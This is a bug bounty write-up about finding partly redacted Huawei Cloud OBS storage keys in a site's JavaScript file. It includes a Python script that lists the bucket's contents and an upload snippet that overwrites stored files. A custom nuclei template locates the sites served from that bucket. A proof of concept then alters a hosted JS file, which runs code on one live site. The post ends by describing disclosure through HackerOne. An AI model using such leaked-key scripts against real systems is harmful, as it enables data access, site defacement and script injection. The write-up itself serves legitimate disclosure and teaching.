---
title: "Exposed secret keys leading to multiple site defacement for $800"
date: 2025-02-21T11:37:50+08:00
draft: false
summary: Finding secret keys in a JS file—this is like finding money in a trashcan. Yeah that's a JavaScript is trash joke.
---
![leaked keys](/leaked-obs-keys.jpg)
> Finding secret keys in a JS file—this is like finding money in a trashcan. Yeah that's a JavaScript is trash joke.

Revisiting another old report.

I found exposed secret keys in a inconspicious JavaScript file at `river.[redacted].com`, which could allow a malicious actor to deface multiple websites of a entertainment platform in the Philippines and I got $800 out of it.

---

Doing my usual poking-around after work, I found this seemingly new, but otherwise normal-looking website of my target.

I checked the website out, did my usual fuzzing and find nothing. I couldn't even tell what the website does—I couldn't get past the login screen.

I inspected the source code, opened its JS files, and checked for any API calls, and I found nothing of interest. Then I did a global text search for `_key`, just in case some lazy developer didn't bother configuring their secret keys properly.

```plaintext
var define_import_meta_env_default$1 = {
...
	VITE_OBS_BUCKET_NAME: "dl-patch-river-com",
	VITE_OBS_PATH_PREFIX: "mgames/nhk/common/events/",
	VITE_OBS_ACCESS_KEY: "ATXC1DVXV2[redacted]",
	VITE_OBS_SECRET_KEY: "EQnZvv1HfpEoT62[redacted]",
...
};
```
> _Welp, well I be damned_

Interesting. But I have no idea what these keys are for. Looking up "OBS", [Huawei Cloud OBS](https://www.huaweicloud.com/intl/en-us/product/obs.html) turns up.

## Huawei Cloud Object Storage Service

[**Huawei Cloud OBS**](https://www.huaweicloud.com/intl/en-us/product/obs.html)—is a file bucket storage service by Huawei Cloud. It's basically an alternative to Amazon S3 and Google Cloud Storage.

They also have a Python SDK `esdk-obs-python`, which should make it easier for me to write a Python exploit script.

## Testing the leaked keys

### Testing read access
I wrote a simple Python script that lists down all of the contents of the bucket:

```py
# obs.py
from obs import ObsClient


if __name__ == "__main__":
    access_key = "ATXC1D[redacted]"
    secret_key = "EQnZvv1HfpEoT6[redacted]"
    bucket = "dl-patch-[redacted]-com"
    server = "https://obs.ap-southeast-3.myhuaweicloud.com/"
    region = "ap-southeast-3"

    prefix = "mgames/nhk/common/events/"
    
    obsClient = ObsClient(
        access_key_id=access_key,
        secret_access_key=secret_key,
        server=server
    )

    objects = obsClient.listObjects(bucket)
    for obj in objects.body.contents:
        print(obj.url)
    
    obsClient.close()
```

Running the script, I was able to fetch the contents of the bucket which contains 5,000+ objects:

```plaintext
https://dl.[redacted].com/mgames/nhk/common/events/2023/
https://dl.[redacted].com/mgames/nhk/common/events/2023/css/
https://dl.[redacted].com/mgames/nhk/common/events/2023/css/bootstrap-grid.css
https://dl.[redacted].com/mgames/nhk/common/events/2023/css/bootstrap-grid.css.map
https://dl.[redacted].com/mgames/nhk/common/events/2023/css/bootstrap-reboot.css
https://dl.[redacted].com/mgames/nhk/common/events/2023/css/bootstrap-reboot.css.map
https://dl.[redacted].com/mgames/nhk/common/events/2023/css/bootstrap-utilities.css
https://dl.[redacted].com/mgames/nhk/common/events/2023/css/bootstrap-utilities.css.map
https://dl.[redacted].com/mgames/nhk/common/events/2023/fonts/
https://dl.[redacted].com/mgames/nhk/common/events/2023/fonts/AgencyFB-Black.eot
https://dl.[redacted].com/mgames/nhk/common/events/2023/fonts/AgencyFB-Black.svg
https://dl.[redacted].com/mgames/nhk/common/events/2023/fonts/AgencyFB-Black.ttf
https://dl.[redacted].com/mgames/nhk/common/events/2023/fonts/AgencyFB-Black.wof
...[redacted for brevity]...
```
> _The keys worked!_

### Testing write access
I adjusted the script to upload an HTML file to the bucket

```py
    target_file = f"{prefix}/tedminfosec.html"
    local_file = "./tedminfosec.html"
    print(f"Uploading {local_file} to {target_file}")
    obsClient.putFile(bucket, target_file, local_file)
```

And sure enough, my HTML file was uploaded to the bucket!

![html file](/leaked-obs-keys-html-file.png)

## Important observation
- I noticed that I was able to _update_ my file by running the script again. **This means I could potentially overwrite any item in the bucket.**

## Understanding the potential impact

Knowing that my target has _thousands_ of domains, I asked myself:
- _Could it be possible that this bucket serves static files for some of these websites?_
- _Is there a way for me to inject arbitrary JavaScript code into these websites?_

Analyzing the leak, a notable configuration setting is the `VITE_OBS_PATH_PREFIX`, which has the value `mgames/nhk/common/events/`.

This means I have to **identify all websites that contain `mgames/nhk/common/events/` in their source code.** To do that, I used [nuclei](https://github.com/projectdiscovery/nuclei) with a custom template.

## Writing a custom nuclei template

Nuclei is a fast, customizable vulnerability scanner but has a somewhat bad rap in the bug bounty community because a lot of researchers get dupes from it. That's simply bound to happen if everyone uses the same templates!

I think nuclei is best used for low-hanging bugs and _custom templates_ that you write yourself. Writing effective custom templates, however, requires a deep understanding of the target.

Here's my custom template to identify the websites that use the compromised storage bucket:

```yaml
id: obs-leak 
info:
  name: OBS Leak
  author: tedm.infosec
  severity: info
requests:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers:
      - type: word
        words: 
          - "mgames/nhk/common/events/"
        part: body
```

With the list of live subdomains of `[redacted].com` in `http.txt`, I pipe it into `nuclei` like so:

```plaintext
cat http.txt | nuclei -t ~/custom-nuclei-templates/adhoc/tmp.yaml
                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.1.10

                projectdiscovery.io

[WRN] Found 1 templates loaded with deprecated protocol syntax, update before v3 for continued support.
[INF] Current nuclei version: v3.1.10 (outdated)
[INF] Current nuclei-templates version: v10.1.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 52
[INF] Templates loaded for current scan: 1
[WRN] Executing 1 unsigned templates. Use with caution.
[INF] Targets loaded for current scan: 6004
[obs-leak] [http] [info] https://console.df.[redacted].com/
[obs-leak] [http] [info] https://voting.df.[redacted].com/
[obs-leak] [http] [info] https://members.[redacted].com/
[obs-leak] [http] [info] https://connect.16273.[redacted].com/
...[redacted for brevity]...
```

## Running arbitrary JavaScript in one of their websites
I chose one seemingly unimportant website from the list of websites detected by `nuclei`. Then I identified the JS file hosted from the bucket, updated its code so it prints out `hello from tedminfosec` in the console:

![proof of concept](/leaked-obs-keys.PNG)
> _It works._

## Responsible disclosure
Now that I have a good proof-of-concept to show that I compromised their website, I submitted a report detailing my exploit through their HackerOne of the company. A few weeks later I receive a reply:

![reward](/leaked-obs-keys-reward.PNG?1)

## Takeaways
- Developers _always_ make mistakes, capitalize on that.
- Knowing how to write your own `nuclei` templates can be incredibly useful.
- A bit of Python can help in writing exploits.
- Mapping the attack surface of a target is crucial for successful attacks.